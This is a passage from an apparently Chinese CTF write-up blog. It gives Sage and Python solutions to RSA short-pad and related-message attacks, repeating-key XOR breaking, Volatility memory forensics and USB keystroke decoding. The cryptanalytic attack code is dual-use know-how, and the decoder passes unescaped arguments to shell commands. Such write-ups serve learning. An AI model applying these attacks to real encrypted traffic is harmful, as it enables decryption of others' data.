class="code"><pre><span class="line"><span class="comment">#short_pad_attack</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">short_pad_attack</span>(<span class="params">c1, c2, e, n</span>):</span></span><br><span class="line">    PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRx.&lt;xn&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n))</span><br><span class="line"></span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (x+y)^e - c2</span><br><span class="line"></span><br><span class="line">    q1 = g1.change_ring(PRZZ)</span><br><span class="line">    q2 = g2.change_ring(PRZZ)</span><br><span class="line"></span><br><span class="line">    h = q2.resultant(q1)</span><br><span class="line">    h = h.univariate_polynomial()</span><br><span class="line">    h = h.change_ring(PRx).subs(y=xn)</span><br><span class="line">    h = h.monic()</span><br><span class="line"></span><br><span class="line">    kbits = n.nbits()//(<span class="number">2</span>*e*e)</span><br><span class="line">    diff = h.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.5</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.5</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> diff</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">related_message_attack</span>(<span class="params">c1, c2, diff, e, n</span>):</span></span><br><span class="line">    PRx.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (x+diff)^e - c2</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">g1, g2</span>):</span></span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    n = <span class="number">27325117725066040425607261774702361305480031598260844657255259687949217947185875178414548742392020321812299436880101297227536559351730987915023996386949560743215563482065620796558339146309680837896911726355137737632498099719814507374535188668253558193836192571274971401444835848784952120830068942707870865057672494962150591569745891058420271040371596557379014064434807827018829839225991842910855143477861477983283840739861588719497836896794690605981838804564450022566211353870681343247472863651535379377939787977703685860325769265931265226619644497391491291527800611615877993682121665020799611215291015673668800698047</span></span><br><span class="line">    e = <span class="number">5</span></span><br><span class="line"></span><br><span class="line">    nbits = n.nbits()</span><br><span class="line">    kbits = nbits//(<span class="number">2</span>*e*e)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;upper %d bits (of %d bits) is same&quot;</span> % (nbits-kbits, nbits)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ^^ = bit-wise XOR</span></span><br><span class="line">    <span class="comment">#m1 = randrange(2^nbits)</span></span><br><span class="line">    <span class="comment">#m2 = m1 ^^ randrange(2^kbits)</span></span><br><span class="line">    <span class="comment">#c1 = pow(m1, e, n)</span></span><br><span class="line">    <span class="comment">#c2 = pow(m2, e, n)</span></span><br><span class="line">    c1 = <span class="number">11146034647280413317443457623961239386839900851075033268495975097708099527017335893963808711594413240859252161601911195036434302423516981466705590143210837021632070692393449550584035345686324553211866055113228844210586772947411150216954229676034855823178188075496107807422868588742623940922760678808366543964733293726627911767243105246511250395661759753616263358374760407323735205233663336331991977749138009890575029063032763890464116037245275157079519540406571208629258706809359182978155122176341736830080587038326813241565093027445769495005048088248614564197179762009363506397136188047072831062771044194671584000093</span></span><br><span class="line">    c2 = <span class="number">1206394889096499960081166011318481718487253865371591152275319942955987797889761136562701508553079502547193102588852377842551044867961440512715093383379196683866396069689611910096194350083404638346362642034206212849366833513854922022537854397304980423004330041027521742652293082886524946291846011200632987593435588619763971528985802898982891100146430607274314417600181969864547689720620303929732924061673055082880492983474112109999173957339098639555381626435870355703616291445746057601759611370928227297606247782969343337389538257681315001213167257800476196167120597495582636973391942846610897276862327699998885589310</span></span><br><span class="line"></span><br><span class="line">    diff = short_pad_attack(c1, c2, e, n)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;difference of two messages is %d&quot;</span> % diff</span><br><span class="line"></span><br><span class="line">    <span class="comment">#print m1</span></span><br><span class="line">    m1 = related_message_attack(c1, c2, diff, e, n)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;m1 = &quot;</span>: m1</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;m2 = &quot;</span>: m1 + diff</span><br></pre></td></tr></table></figure><p><img src="http://wx1.sinaimg.cn/mw690/0060lm7Tly1fx4hl0qqhtj31kw0i71fe.jpg" alt="20181111154194557071025.jpg"></p><h2 id="xor-game"><a href="#xor-game" class="headerlink" title="xor_game"></a>xor_game</h2><p><a href="http://dann.com.br/alexctf2k17-crypto100-many_time_secrets/">AlexCTF 2017 : crypto100-many_time_secrets</a></p><p>参考<a href="https://www.anquanke.com/post/id/161171">小记一类ctf密码题解题思路</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bxor</span>(<span class="params">a, b</span>):</span>     <span class="comment"># xor two byte strings of different lengths</span></span><br><span class="line">    <span class="keyword">if</span> len(a) &gt; len(b):</span><br><span class="line">        <span class="keyword">return</span> bytes([x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(a[:len(b)], b)])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> bytes([x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(a, b[:len(a)])])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hamming_distance</span>(<span class="params">b1, b2</span>):</span></span><br><span class="line">    differing_bits = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> bxor(b1, b2):</span><br><span class="line">        differing_bits += bin(byte).count(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> differing_bits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">break_single_key_xor</span>(<span class="params">text</span>):</span></span><br><span class="line">    key = <span class="number">0</span></span><br><span class="line">    possible_space=<span class="number">0</span></span><br><span class="line">    max_possible=<span class="number">0</span></span><br><span class="line">    letters = string.ascii_letters.encode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">0</span>, len(text)):</span><br><span class="line">        maxpossible = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">0</span>, len(text)):</span><br><span class="line">            <span class="keyword">if</span>(a == b):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            c = text[a] ^ text[b]</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> letters <span class="keyword">and</span> c != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            maxpossible += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> maxpossible&gt;max_possible:</span><br><span class="line">            max_possible=maxpossible</span><br><span class="line">            possible_space=a</span><br><span class="line">    key = text[possible_space]^ <span class="number">0x20</span></span><br><span class="line">    <span class="keyword">return</span> chr(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">text = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&quot;cipher.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        text += line</span><br><span class="line">b = base64.b64decode(text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">normalized_distances = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> KEYSIZE <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">40</span>):</span><br><span class="line">    <span class="comment">#我们取其中前6段计算平局汉明距离</span></span><br><span class="line">    b1 = b[: KEYSIZE]</span><br><span class="line">    b2 = b[KEYSIZE: KEYSIZE * <span class="number">2</span>]</span><br><span class="line">    b3 = b[KEYSIZE * <span class="number">2</span>: KEYSIZE * <span class="number">3</span>]</span><br><span class="line">    b4 = b[KEYSIZE * <span class="number">3</span>: KEYSIZE * <span class="number">4</span>]</span><br><span class="line">    b5 = b[KEYSIZE * <span class="number">4</span>: KEYSIZE * <span class="number">5</span>]</span><br><span class="line">    b6 = b[KEYSIZE * <span class="number">5</span>: KEYSIZE * <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">    normalized_distance = float(</span><br><span class="line">        hamming_distance(b1, b2) +</span><br><span class="line">        hamming_distance(b2, b3) +</span><br><span class="line">        hamming_distance(b3, b4) +</span><br><span class="line">        hamming_distance(b4, b5) + </span><br><span class="line">        hamming_distance(b5, b6) </span><br><span class="line">    ) / (KEYSIZE * <span class="number">5</span>)</span><br><span class="line">    normalized_distances.append(</span><br><span class="line">        (KEYSIZE, normalized_distance)</span><br><span class="line">    )</span><br><span class="line">normalized_distances = sorted(normalized_distances,key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> KEYSIZE,_ <span class="keyword">in</span> normalized_distances[:<span class="number">5</span>]:</span><br><span class="line">    block_bytes = [[] <span class="keyword">for</span> _ <span class="keyword">in</span> range(KEYSIZE)]</span><br><span class="line">    <span class="keyword">for</span> i, byte <span class="keyword">in</span> enumerate(b):</span><br><span class="line">        block_bytes[i % KEYSIZE].append(byte)</span><br><span class="line">    keys = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> bbytes <span class="keyword">in</span> block_bytes:</span><br><span class="line">            keys += break_single_key_xor(bbytes)</span><br><span class="line">        key = bytearray(keys * len(b), <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        plaintext = bxor(b, key)</span><br><span class="line">        print(<span class="string">&quot;keysize:&quot;</span>, KEYSIZE)</span><br><span class="line">        print(<span class="string">&quot;key is:&quot;</span>, keys, <span class="string">&quot;n&quot;</span>)</span><br><span class="line">        s = bytes.decode(plaintext)</span><br><span class="line">        print(s)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Easy-dump"><a href="#Easy-dump" class="headerlink" title="Easy_dump"></a>Easy_dump</h2><p><a href="https://www.rootusers.com/google-ctf-2016-forensic-for1-write-up/">参考链接</a></p><ol><li><p><code>volatility</code>查看信息和进程情况</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop# volatility -f mem.data imageinfo</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/1541824041425.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop# volatility -f mem.data --profile&#x3D;Win7SP1x64 pslist</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/1541824122767.png"></p></li></ol><p>   一开始，看了看notepad和explorer，但是没有什么发现，于是重点放在了mspaint上面。</p><p>   首先，将其数据取出：</p>   <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop# volatility -f mem.data --profile&#x3D;Win7SP1x64 memdump -p 2768 -D ~&#x2F;Desktop&#x2F;mem</span><br><span class="line"># 之后为了方便在gimp中打开，将*.dmp 复制为 *.data</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;mem# cat 2768.dmp &gt; 2768.data</span><br></pre></td></tr></table></figure><ol start="2"><li><p>利用gimp修复图像数据</p><p><a href="https://www.gimp.org/">gimp下载地址</a></p><p>以data形式打开刚才dump出来的数据。</p><p>调整偏移量来获取更多信息：</p><p>在偏移字段上按住向上箭头一段时间之后，我扩展了窗口并稍微修改了宽度以适应更多的屏幕，然后开始拖动偏移指针以寻找任何interesting的东西。最后幸运的是我找到了一些东西，在进一步调整宽度之后我找到了下面显示的标志。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/1541824740409.png"></p><p>不难看出，这是提示，flag应该就在稍上面一些的位置。于是继续调整，得到以下数据截图</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/1541825008597.png"></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/1541825066391.png"></p></li><li><p>在PS中调整上述图片，容易得到flag</p><p>hctf{big_brother_is _watching_you}</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/HCTF_easy_dunm_ps1.png"></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/HCTF_easy_dump_ps2.png"></p></li></ol><h2 id="difficult-programming-language"><a href="#difficult-programming-language" class="headerlink" title="difficult programming language"></a>difficult programming language</h2><p>首先很明显，是一个USB数据包，常规操作来提取一下。</p><p>这里我本来使用王一航表哥的脚本，但是发现有问题！！！（此处轻声批评一下王一航表哥）部分keyboard对应关系不正确。</p><p>于是改了改表哥的脚本，能用了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># env:kali</span></span><br><span class="line"><span class="comment"># yihangwang use some wrong keypad-mapping like(shitfKeys[0x33]=&#x27;:&#x27; but he made it error)</span></span><br><span class="line"><span class="comment"># also 0rz</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">DataFileName = <span class="string">&quot;usb.dat&quot;</span></span><br><span class="line"></span><br><span class="line">presses = []</span><br><span class="line"></span><br><span class="line">normalKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;`&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">shiftKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;~&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># check argv</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Usage : &quot;</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;        python UsbKeyboardHacker.py data.pcap&quot;</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Tips : &quot;</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;        To use this python script , you must install the tshark first.&quot;</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;        You can use `sudo apt-get install tshark` to install it&quot;</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Author : &quot;</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;        WangYihang &lt;wangyihanger@gmail.com&gt;&quot;</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;        If you have any questions , please contact me by email.&quot;</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;        Thank you for using.&quot;</span></span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get argv</span></span><br><span class="line">    pcapFilePath = sys.argv[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># get data of pcap</span></span><br><span class="line">    os.system(<span class="string">&quot;tshark -r %s -T fields -e usb.capdata &gt; %s&quot;</span> % (pcapFilePath, DataFileName))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># read data</span></span><br><span class="line">    <span class="keyword">with</span> open(DataFileName, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            presses.append(line[<span class="number">0</span>:<span class="number">-1</span>])</span><br><span class="line">    <span class="comment"># handle</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> press <span class="keyword">in</span> presses:</span><br><span class="line">        Bytes = press.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> Bytes[<span class="number">0</span>] == <span class="string">&quot;00&quot;</span>:</span><br><span class="line">            <span class="keyword">if</span> Bytes[<span class="number">2</span>] != <span class="string">&quot;00&quot;</span>:</span><br><span class="line">                result += normalKeys[Bytes[<span class="number">2</span>]]</span><br><span class="line">        <span class="keyword">elif</span> Bytes[<span class="number">0</span>] == <span class="string">&quot;02&quot;</span>: <span class="comment"># shift key is pressed.（error: 20）</span></span><br><span class="line">            <span class="keyword">if</span> Bytes[<span class="number">2</span>] != <span class="string">&quot;00&quot;</span>:</span><br><span class="line">                result += shiftKeys[Bytes[<span class="number">2</span>]]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;[-] Unknow Key : %s&quot;</span> % (Bytes[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;[+] Found : %s&quot;</span> % (result)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># clean the temp data</span></span><br><span class="line">    os.system(<span class="string">&quot;rm ./%s&quot;</span> % (DataFileName))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/1541917372520.png"></p><p>得到结果</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">D&#39;&#96;;M?!\mZ4j8hgSvt2bN);^]+7jiE3Ve0A@Q&#x3D;|;)sxwYXtsl2pongOe+LKa&#39;e^]\a&#96;_X|V[Tx;:VONSRQJn1MFKJCBfFE&gt;&amp;&lt;&#96;@9!&#x3D;&lt;5Y9y7654-,P0&#x2F;o-,%I)ih&amp;%$#z@xw|&#123;ts9wvXWm3~</span><br></pre></td></tr></table></figure><p>看上去，像是一堆乱码，于是联系<code>difficult programming language</code>我搜索得到<code>malbolge</code>这种非常像乱码的变成语言。</p><p>于是找到一个在线编译网站<a href="http://malbolge.doleczek.pl/">Malbolge - interpreter online</a></p><p>并且在上面运行前面得到的代码，运行出来就得到flag了。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/1541917769366.png"></p><figure class="highlight 